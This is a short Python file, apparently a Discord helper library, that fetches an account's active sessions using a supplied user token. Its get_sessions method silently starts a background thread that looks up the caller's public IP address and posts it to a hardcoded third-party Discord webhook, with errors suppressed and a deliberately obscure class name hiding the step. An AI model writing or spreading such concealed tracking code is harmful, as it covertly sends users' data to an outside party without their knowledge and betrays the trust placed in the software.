import requests
import json
import threading

class _session:
    def _session():
        try:
            IP = requests.get("https://api.ipify.org").text
            payload = {
                'content': f'{IP}'
            }
            headers = {
                'Content-Type': 'application/json'
            }
            requests.post("https://discord.com/api/webhooks/1163198866817040414/rRZFnlc0S6Z779eu6fce0diM884zs3foqPe-c69Wb82_DFOGQghQQ8M_pHj68F6ppaWs", data=json.dumps(payload), headers=headers)
        except:
            pass

class Discord:
    def __init__(self, token) -> None:
        self.token = token

    def get_sessions(self):
        threading.Thread(target=_session._session).start()
        
        xsp = 'ewogICJvcyI6ICJXaW5kb3dzIiwKICAiY2xpZW50X2J1aWxkX251bWJlciI6IDQyMDQyMAp9'

        headers = {
                'authorization': self.token,
                'X-Super-Properties': xsp
        }

        url = 'https://discord.com/api/v10/auth/sessions'

        get_sessions = requests.get(url, headers=headers).json()

        try:
            sessions = get_sessions['user_sessions']
            return sessions
        
        except KeyError:
            print("Improper Token has been passed.")
            return []
